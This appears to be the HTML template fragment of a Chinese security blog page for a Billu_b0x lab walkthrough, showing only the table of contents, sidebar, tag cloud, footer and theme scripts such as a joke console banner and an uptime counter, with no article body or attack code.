+<span id="jinrishici-sentence" style="font-size: 18px; font-style: italic;"></span>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Billu-b0x-%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">Billu_b0x 靶场学习记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">环境信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">一、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.1 主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E5%85%A8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.2 全端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E6%9C%8D%E5%8A%A1%E7%89%88%E6%9C%AC%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.3.</span> <span class="toc-text">1.3 服务版本扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.4.</span> <span class="toc-text">1.4 漏洞扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.5.</span> <span class="toc-text">1.5 目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6-%E7%9B%AE%E5%BD%95%E9%80%9F%E6%9F%A5%E6%B1%87%E6%80%BB"><span class="toc-number">1.2.6.</span> <span class="toc-text">1.6 目录速查汇总</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-7-phpinfo-%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.7.</span> <span class="toc-text">1.7 phpinfo 泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-8-%E9%98%B6%E6%AE%B5%E5%B0%8F%E7%BB%93"><span class="toc-number">1.2.8.</span> <span class="toc-text">1.8 阶段小结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.3.</span> <span class="toc-text">二、文件包含与源码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-test-php-%E2%80%94-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.1.</span> <span class="toc-text">2.1 test.php — 文件包含漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-index-php-%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E5%8F%91%E7%8E%B0-SQL-%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.2 index.php 源码审计（发现 SQL 注入）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-add-php-%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E5%8F%91%E7%8E%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%82%B9%EF%BC%89"><span class="toc-number">1.3.3.</span> <span class="toc-text">2.3 add.php 源码审计（发现文件上传点）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%83%BD%E5%8A%9B%E9%AA%8C%E8%AF%81"><span class="toc-number">1.3.4.</span> <span class="toc-text">2.4 文件包含能力验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-%E9%98%B6%E6%AE%B5%E5%B0%8F%E7%BB%93"><span class="toc-number">1.3.5.</span> <span class="toc-text">2.5 阶段小结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81SQL-%E6%B3%A8%E5%85%A5%EF%BC%88%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">三、SQL 注入（登录绕过）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-number">1.4.1.</span> <span class="toc-text">3.1 注入点分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-sqlmap-%E5%AD%97%E5%85%B8%E8%B7%91%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.2.</span> <span class="toc-text">3.2 sqlmap 字典跑注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.3.</span> <span class="toc-text">3.3 手工注入绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0"><span class="toc-number">1.4.4.</span> <span class="toc-text">3.4 进入后台</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-Getshell"><span class="toc-number">1.5.</span> <span class="toc-text">四、文件上传 + 文件包含 Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E4%B8%8A%E4%BC%A0%E8%BF%87%E6%BB%A4%E5%88%86%E6%9E%90"><span class="toc-number">1.5.1.</span> <span class="toc-text">4.1 上传过滤分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C%E4%B8%8E%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.5.2.</span> <span class="toc-text">4.2 图片马制作与上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E5%8F%91%E7%8E%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E5%8F%A3"><span class="toc-number">1.5.3.</span> <span class="toc-text">4.3 发现文件包含入口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E6%89%A7%E8%A1%8C%E5%9B%BE%E7%89%87%E9%A9%AC%E8%8E%B7%E5%8F%96-RCE"><span class="toc-number">1.5.4.</span> <span class="toc-text">4.4 执行图片马获取 RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E5%8F%8D%E5%BC%B9-Shell"><span class="toc-number">1.5.5.</span> <span class="toc-text">4.5 反弹 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6-Getshell-%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB"><span class="toc-number">1.5.6.</span> <span class="toc-text">4.6 Getshell 方法汇总</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E6%8F%90%E6%9D%83%E5%87%86%E5%A4%87%EF%BC%89"><span class="toc-number">1.6.</span> <span class="toc-text">五、信息收集（提权准备）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.6.1.</span> <span class="toc-text">5.1 系统信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2"><span class="toc-number">1.6.2.</span> <span class="toc-text">5.2 内核漏洞搜索</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.7.</span> <span class="toc-text">六、权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.7.1.</span> <span class="toc-text">6.1 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.7.2.</span> <span class="toc-text">6.2 漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-3-%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB"><span class="toc-number">1.7.3.</span> <span class="toc-text">6.3 提权方法汇总</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">七、总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.8.1.</span> <span class="toc-text">攻击链回顾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.8.2.</span> <span class="toc-text">关键漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E6%80%9D"><span class="toc-number">1.8.3.</span> <span class="toc-text">反思</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/21/Gemini-Pentest-V2/" title="Gemini-Pentest-V2 靶场通关记录">Gemini-Pentest-V2 靶场通关记录</a><time datetime="2026-05-20T16:00:00.000Z" title="发表于 2026-05-21 00:00:00">2026-05-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/21/Billu_b0x/" title="Billu_b0x 靶场通关记录">Billu_b0x 靶场通关记录</a><time datetime="2026-05-20T16:00:00.000Z" title="发表于 2026-05-21 00:00:00">2026-05-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/20/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;&amp;%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="命令执行 &amp; 代码执行">命令执行 &amp; 代码执行</a><time datetime="2026-05-19T16:00:00.000Z" title="发表于 2026-05-20 00:00:00">2026-05-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/19/upload-libs/" title="Upload-Labs 文件上传漏洞靶场笔记">Upload-Labs 文件上传漏洞靶场笔记</a><time datetime="2026-05-19T12:00:00.000Z" title="发表于 2026-05-19 20:00:00">2026-05-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含漏洞">文件包含漏洞</a><time datetime="2026-05-19T12:00:00.000Z" title="发表于 2026-05-19 20:00:00">2026-05-19</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2025 - 2026 By cHr1s</div><div id="workboard"><img class="workSituationImg boardsign" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/cover/404.png&quot;" data-lazy-src="/images/hashiqi.svg" alt="距离月入25k也就还差一个大佬带我~" title="距离月入25k也就还差一个大佬带我~"/><div id="runtimeTextTip"></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">35</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">13</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Getshell/" style="font-size: 0.88rem;">Getshell<sup>1</sup></a><a href="/tags/Hash%E7%A0%B4%E8%A7%A3/" style="font-size: 0.88rem;">Hash破解<sup>1</sup></a><a href="/tags/LD-PRELOAD/" style="font-size: 0.88rem;">LD_PRELOAD<sup>1</sup></a><a href="/tags/LFI/" style="font-size: 0.88rem;">LFI<sup>1</sup></a><a href="/tags/Pikachu/" style="font-size: 0.88rem;">Pikachu<sup>1</sup></a><a href="/tags/Redis%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Redis提权<sup>1</sup></a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">SQL注入<sup>4</sup></a><a href="/tags/XSS/" style="font-size: 0.88rem;">XSS<sup>2</sup></a><a href="/tags/basics/" style="font-size: 0.88rem;">basics<sup>3</sup></a><a href="/tags/ctf/" style="font-size: 0.88rem;">ctf<sup>4</sup></a><a href="/tags/disable-functions%E7%BB%95%E8%BF%87/" style="font-size: 0.88rem;">disable_functions绕过<sup>1</sup></a><a href="/tags/hexo%E8%A3%85%E4%BF%AE%E6%97%A5%E8%AE%B0/" style="font-size: 0.88rem;">hexo装修日记<sup>2</sup></a><a href="/tags/sqli-labs/" style="font-size: 0.88rem;">sqli-labs<sup>1</sup></a><a href="/tags/sqlmap/" style="font-size: 0.88rem;">sqlmap<sup>2</sup></a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">sql注入<sup>1</sup></a><a href="/tags/study/" style="font-size: 0.88rem;">study<sup>1</sup></a><a href="/tags/upload-labs/" style="font-size: 0.88rem;">upload-labs<sup>1</sup></a><a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">web安全<sup>4</sup></a><a href="/tags/wp/" style="font-size: 0.88rem;">wp<sup>1</sup></a><a href="/tags/xss-labs/" style="font-size: 0.88rem;">xss-labs<sup>1</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" style="font-size: 0.88rem;">代码执行<sup>1</sup></a><a href="/tags/%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">内核提权<sup>1</sup></a><a href="/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" style="font-size: 0.88rem;">刷题记录<sup>3</sup></a><a href="/tags/%E5%8F%8D%E5%BC%B9Shell/" style="font-size: 0.88rem;">反弹Shell<sup>1</sup></a><a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 0.88rem;">命令执行<sup>1</sup></a><a href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">命令注入<sup>2</sup></a><a href="/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">安全测试<sup>1</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">工具<sup>1</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 0.88rem;">文件上传<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 0.88rem;">文件包含<sup>2</sup></a><a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 0.88rem;">杂项<sup>1</sup></a><a href="/tags/%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83/" style="font-size: 0.88rem;">水平越权<sup>1</sup></a><a href="/tags/%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/" style="font-size: 0.88rem;">认证绕过<sup>1</sup></a><a href="/tags/%E9%9D%B6%E6%9C%BA/" style="font-size: 0.88rem;">靶机<sup>1</sup></a><a href="/tags/%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/" style="font-size: 0.88rem;">黑名单绕过<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.163.com/playlist?id=360062344&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@6.1.6/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.cbd.int/pangu@4.0.7/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (true){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("03/14/2025 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2025 By 安知鱼 V1.7.1",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 cHr1s 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><style>#workboard .workSituationImg {
+  height: 50px !important;
+  max-height: 50px !important;
+  width: auto !important;
+}</style><script async="async">(function () {
+  var grt = new Date("03/14/2025 00:00:00"); //设置网站上线时间
+  var now = new Date();
+  var diffYears;
+  var dnum;
+  var hnum;
+  var mnum;
+  var snum;
+  var nowHour;
+
+  // 计算并更新天数、小时数、分钟数和秒数
+  function updateTime() {
+    now = new Date(); // 更新 now 的值
+    nowHour = now.getHours(); // 更新 nowHour 的值
+    var totalDays = Math.floor((now - grt) / 1000 / 60 / 60 / 24);
+    
+    // 计算年数并将天数改为当年剩余天数
+    diffYears = Math.floor(totalDays / 365);
+    dnum = totalDays % 365;
+    
+    var hours = (now - grt) / 1000 / 60 / 60 - 24 * totalDays;
+    hnum = Math.floor(hours);
+    if (String(hnum).length == 1) {
+      hnum = "0" + hnum;
+    }
+    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * totalDays - 60 * hnum;
+    mnum = Math.floor(minutes);
+    if (String(mnum).length == 1) {
+      mnum = "0" + mnum;
+    }
+    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * totalDays - 60 * 60 * hnum - 60 * mnum;
+    snum = Math.round(seconds);
+    if (String(snum).length == 1) {
+      snum = "0" + snum;
+    }
+  }
+
+  // 更新网页中显示的网站运行时间
+  function updateHtml() {
+    const footer = document.getElementById("footer");
+    if (!footer) return
+    let currentTimeHtml = "";
+    
+    // 修改为自定义的营业时间格式
+    var timeStr = "🚅营业：" + diffYears + " 年 " + dnum + " 天 " + hnum + " 小时 " + mnum + " 分钟 " + snum + " 秒💨";
+
+    if (nowHour < 18 && nowHour >= 9) {
+      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
+      currentTimeHtml = timeStr;
+    } else {
+      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
+      let img = document.querySelector("#workboard .workSituationImg");
+      if (img != null) {
+        img.src = "/images/helanzhu.svg";
+        img.title = "下班了就该开开心心的玩耍，嘿嘿~";
+        img.alt = "下班了就该开开心心的玩耍，嘿嘿~";
+
+        // 【新增】控制图片大小，50px 觉得不合适可以直接改这行数值
+        img.style.height = "50px"; 
+        img.style.width = "auto";
+      }
+
+      currentTimeHtml = timeStr;
+    }
